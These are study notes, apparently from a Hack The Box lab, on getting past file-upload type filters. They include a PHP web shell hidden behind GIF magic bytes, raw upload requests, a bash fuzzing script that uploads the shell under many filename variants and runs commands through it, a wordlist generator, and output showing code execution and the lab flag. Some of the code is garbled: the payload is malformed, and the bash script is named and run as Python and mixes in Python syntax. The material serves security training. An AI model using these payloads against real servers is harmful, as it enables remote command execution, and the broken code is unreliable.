---
tags: [CWES, HTB, technical-reference]
module: "File Upload Attacks"
source_file: "CWES.xmind"
---

# Type Filters

> [!info] Complete technical reference
> Section imported without removing commands, hints, links, notes, or images.

## many modern web servers and web applications also test the content of the uploaded file

## We see that we get a message saying Only images are allowed. The error message persists, and our file fails to upload even if we try some of the tricks we learned in the previous sections.

### if we use shell.jpg with a web shell content, our upload will fail

## validating the file content

### Content-Type Header

- file upload HTTP request has two Content-Type headers
  - one for the attached file (at the bottom)
  - and one for the full request (at the top)
- example of how a PHP web application tests the Content-Type header
  - Code: php
    - $type = $_FILES['uploadFile']['type'];  

      if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {  
      echo "Only images are allowed";  
      die();  
      }
- FUZZ
  - <https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt>
    - the message tells us that only images are allowed
      - we can limit our scan to image types, which reduces the wordlist to 45
        - cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
- e.g. image/jpg
  - This time we get File successfully uploaded,
    - http://SERVER_IP:PORT/profile_images/shell.php?cmd=id
      - uid=33(www-data) gid=33(www-data) groups=33(www-data)
### File Content

- MIME-Type
  - This is usually done by inspecting the first few bytes of the file's content, which contain the File Signature or Magic Bytes
    - <https://en.wikipedia.org/wiki/List_of_file_signatures>
    - <https://web.archive.org/web/20240522030920/https://opensource.apple.com/source/file/file-23/file/magic/magic.mime>
  - if a file starts with (GIF87a or GIF89a)
    - this indicates that it is a GIF image
      - If we change the first bytes of any file to the GIF magic bytes, its MIME type would be changed to a GIF image
  - basic example
    - create a basic file with text in it
      - echo "this is a text file" > text.jpg
        - file text.jpg
          - text.jpg: ASCII text
      - write GIF8 to the beginning of the file
        - echo "GIF8" > text.jpg
          - file text.jpg
            - text.jpg: GIF image data
  - PHP web application can test the MIME type
    - Code: php
      - $type = mime_content_type($_FILES['uploadFile']['tmp_name']);  

        if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {  
        echo "Only images are allowed";  
        die();  
        }
  - let's try to add GIF8 before our PHP code to try to imitate a GIF image while keeping our file extension as .php,
    - ...  
      Connection: close  

      -W...."uploadFile"; filename="shell.php"  
      Content-Type: image/jpg  

      GIF8  
      <?<!-- -->php system($ REQUEST('cmd' ]); ?>
      - File successfully uploaded
        - http://SERVER_IP:PORT/profile_images/shell.php?cmd=id
          - GIF8 uid=33(www-data) gid=33(www-data) groups=33(www-data)
### LAB

- HTTP POST Message like
  - ...  
    Connection: close  

    -W...."uploadFile"; filename="shell.php"  
    Content-Type: image/jpg  

    GIF8  
    <?<!-- -->php system($ REQUEST('cmd' ]); ?>
    - File successfully uploaded
- preepare script files
  - script.py
    - #!/bin/bash  

      if [ $# -ne 3 ]; then  
      echo "Usage: $0 <host> <port> <wordlist>"  
      echo "Example: $0 94.237.58.137 43049 wordlist.txt"  
      exit 1  
      fi  

      HOST="$1"  
      PORT="$2"  
      WORDLIST="$3"  
      BASE_URL="http://$HOST:$PORT"  
      BOUNDARY="----geckoformboundarytest123"  

      echo "[*] Target: $HOST:$PORT"  
      echo "[*] Wordlist: $WORDLIST"  
      echo "[*] Starting fuzzing..."  
      echo ""  

      total=$(wc -l < "$WORDLIST")  
      count=0  
      success_count=0  

      while IFS= read -r filename; do  
      ((count++))  
      echo -ne "[*] Testing ($count/$total): $filename\r"  

      # Upload the file  
      response=$(curl -s -X POST "$BASE_URL/upload.php" \  
      -H "Host: $HOST:$PORT" \  
      -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" \  
      -H "Accept: */*" \  
      -H "Accept-Language: en-US,en;q=0.5" \  
      -H "Referer: $BASE_URL/" \  
      -H "X-Requested-With: XMLHttpRequest" \  
      -H "Content-Type: multipart/form-data; boundary=$BOUNDARY" \  
      -H "Origin: $BASE_URL" \  
      -H "Connection: keep-alive" \  
      -H "Sec-GPC: 1" \  
      -H "Priority: u=0" \  
      -d $'--'"$BOUNDARY"$'\r\nContent-Disposition: form-data; name="uploadFile"; filename="'"$filename"$'"\r\nContent-Type: image/jpeg\r\n\r\nGIF8\r\n<?<!-- -->php sys<!-- -->tem($_REQUEST["cmd"]); ?>\r\n--'"$BOUNDARY"$'--' \  
      -w " %{http_code}")  

      upload_status=$(echo "$response" | awk '{print $NF}')  

      if [ "$upload_status" = "200" ]; then  
      sleep 0.5  

      # Test multiple variations  
      test_urls=()  

      # Original  
      test_urls+=("$filename")  

      # URL encoded  
      encoded=$(echo -n "$filename" | sed 's/:/%3A/g; s/ /%20/g; s/\//%2F/g')  
      test_urls+=("$encoded")  

      # Cleaned (remove special chars)  
      cleaned=$(echo "$filename" | tr -d ':;/\\')  
      test_urls+=("$cleaned")  

      for test_name in "${test_urls[@]}"; do  
      test_response=$(curl -s -w " %{http_code}" "$BASE_URL/profile_images/$test_name?cmd=id")  
      test_status=$(echo "$test_response" | awk '{print $NF}')  
      test_content=$(echo "$test_response" | sed '$d')  

      if [ "$test_status" != "404" ]; then  
      echo -e "\n[+] SUCCESS!"  
      echo "   Filename: $filename"  
      echo "   Tested as: $test_name"  
      echo "   Status: $test_status"  

      if [ -n "$test_content" ]; then  
      echo -n "   Content: "  
      echo "$test_content" | head -c 200 | tr -d '\n'  
      if [ ${#test_content} -gt 200 ]; then  
      echo "..."  
      else  
      echo ""  
      fi  
      fi  

      echo "   URL: $BASE_URL/profile_images/$test_name?cmd=id"  
      echo ""  
      ((success_count++))  
      break  
      fi  
      done  
      fi  

      done < "$WORDLIST"  

      echo ""  
      echo "="*60  
      echo "[*] Fuzzing complete!"  
      echo "[*] Total tested: $total"  
      echo "[*] Successful non-404: $success_count"  
      echo "="*60
  - prepare wordlist
    - for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do  
      for ext in '.php' '.php2' '.php3' '.php4' '.php5' '.php6' '.php7' '.phps' '.phps' '.pht' '.phtm' '.phtml' '.pgif' '.shtml' '.htaccess' '.phar' '.inc'; do  
      echo "shell$char$ext.jpg" >> wordlist.txt  
      echo "shell$ext$char.jpg" >> wordlist.txt  
      echo "shell.jpg$char$ext" >> wordlist.txt  
      echo "shell.jpg$ext$char" >> wordlist.txt  
      done  
      done
  - run the script
    - python script.py 94.237.58.137 43049 wordlist.txt
      - [+] SUCCESS!  
        Filename: shell.jpg%20.phtml  
        Tested as: shell.jpg%2520.phtml  
        Status: 200  
        Content: GIF8  
        uid=33(www-data) gid=33(www-data) groups=33(www-data)  
        URL: http://94.237.58.137:43049/profile_images/shell.jpg%2520.phtml?cmd=id
        - modify the script to be
          - full_test_url = f"{base_url}/profile_images/{test_name}?cmd=cat+/flag.txt"
            - HTB{m461c4l_c0n73n7_3xpl0174710n}
